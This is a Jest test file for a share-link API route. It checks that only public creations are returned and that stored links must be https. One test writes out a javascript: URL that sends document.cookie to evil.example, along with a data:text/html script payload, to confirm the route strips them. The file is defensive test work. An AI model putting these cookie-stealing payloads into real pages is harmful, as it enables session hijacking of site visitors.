/** @jest-environment node */
/**
 * GET /api/share/:token — a public creation's links go out only as https URLs. The owner can write any string into
 * `user_creations.url` straight through the anon key, and the share page used it as its Download href.
 */
let mockRow: Record<string, unknown> | null = null;
const mockEq: Array<[string, unknown]> = [];
jest.mock('../../../../lib/supabase/server', () => ({
  createServiceRoleClient: () => ({
    from: () => {
      const chain: Record<string, unknown> = {};
      chain.select = () => chain;
      chain.eq = (col: string, val: unknown) => { mockEq.push([col, val]); return chain; };
      chain.maybeSingle = async () => ({ data: mockRow, error: null });
      return chain;
    },
  }),
}));

import { NextRequest } from 'next/server';
import { GET } from './route';

const get = async (token = 'tok') => {
  const res = await GET(new NextRequest(`https://myavatar.ge/api/share/${token}`), { params: { token } });
  return { status: res.status, json: (await res.json()) as { creation?: Record<string, unknown> } };
};

beforeEach(() => {
  mockEq.length = 0;
  mockRow = { id: 'c1', kind: 'video', title: 'Cat', url: 'https://cdn.example/v.mp4', thumbnail_url: 'https://cdn.example/t.jpg', is_public: true, share_token: 'tok' };
});

test('only a PUBLIC row is looked up, by its token', async () => {
  await get('tok');
  expect(mockEq).toEqual(expect.arrayContaining([['share_token', 'tok'], ['is_public', true]]));
});

test('https links are returned as stored', async () => {
  const r = await get();
  expect(r.status).toBe(200);
  expect(r.json.creation).toMatchObject({ url: 'https://cdn.example/v.mp4', thumbnail_url: 'https://cdn.example/t.jpg' });
});

test('a javascript: / data: link written straight into the row never reaches the page', async () => {
  mockRow = { ...mockRow, url: 'javascript:fetch("//evil.example?c="+document.cookie)', thumbnail_url: 'data:text/html,<script>alert(1)</script>' };
  const r = await get();
  expect(r.status).toBe(200);
  expect(r.json.creation).toMatchObject({ id: 'c1', url: null, thumbnail_url: null });
});

test('an unknown or private token is 404', async () => {
  mockRow = null;
  expect((await get('nope')).status).toBe(404);
});
